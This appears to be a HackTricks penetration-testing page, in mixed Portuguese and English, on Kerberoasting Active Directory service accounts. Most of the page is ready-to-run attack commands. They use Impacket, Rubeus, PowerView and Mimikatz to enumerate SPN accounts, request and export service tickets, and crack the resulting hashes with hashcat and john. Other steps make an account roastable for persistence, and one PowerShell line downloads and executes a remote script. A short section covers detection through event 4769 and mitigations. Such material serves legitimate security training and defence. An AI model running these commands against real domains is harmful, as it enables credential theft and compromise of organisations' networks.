# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting foca na aquisição de **TGS tickets**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que originam de **senhas de usuário**, permitindo a possibilidade de **cracking de credenciais offline**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.

Para executar **Kerberoasting**, é essencial uma conta de domínio capaz de solicitar **TGS tickets**; no entanto, esse processo não exige **privilégios especiais**, tornando-o acessível a qualquer um com **credenciais de domínio válidas**.

### Pontos Chave:

- **Kerberoasting** visa **TGS tickets** para **serviços de conta de usuário** dentro do **AD**.
- Tickets criptografados com chaves de **senhas de usuário** podem ser **crackeados offline**.
- Um serviço é identificado por um **ServicePrincipalName** que não é nulo.
- **Nenhum privilégio especial** é necessário, apenas **credenciais de domínio válidas**.

### **Ataque**

> [!WARNING]
> **Ferramentas de Kerberoasting** normalmente solicitam **`RC4 encryption`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque **RC4 é** [**mais fraco**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) e mais fácil de crackear offline usando ferramentas como Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
> Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.` 
> Além disso, tenha cuidado porque `Rubeus.exe kerberoast` solicita tickets automaticamente sobre TODAS as contas vulneráveis, o que pode te fazer ser detectado. Primeiro, encontre usuários kerberoastable com privilégios interessantes e então execute apenas sobre eles.
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # A senha será solicitada
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerar usuários kerberoastable
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Extrair hashes
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMÍNIO.COMPLETO> -ip <DC_IP> -u <NOME_DE_USUÁRIO> -p <SENHA> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Obter usuários Kerberoastable
setspn.exe -Q */* #Este é um binário embutido. Concentre-se nas contas de usuário
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#Obter TGS na memória de um único usuário
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Exemplo: MSSQLSvc/mgmt.domain.local

#Obter TGSs para TODAS as contas kerberoastable (PCs incluídos, não é muito inteligente)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#Listar tickets kerberos na memória
klist

# Extraí-los da memória
Invoke-Mimikatz -Command '"kerberos::list /export"' #Exportar tickets para a pasta atual

# Transformar ticket kirbi para john
python2.7 kirbi2john.py sqldev.kirbi
# Transformar john para hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: Obter hash Kerberoast de um usuário
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Usando PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Obter todos os hashes Kerberoast
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Usuário específico
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Obter administradores

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
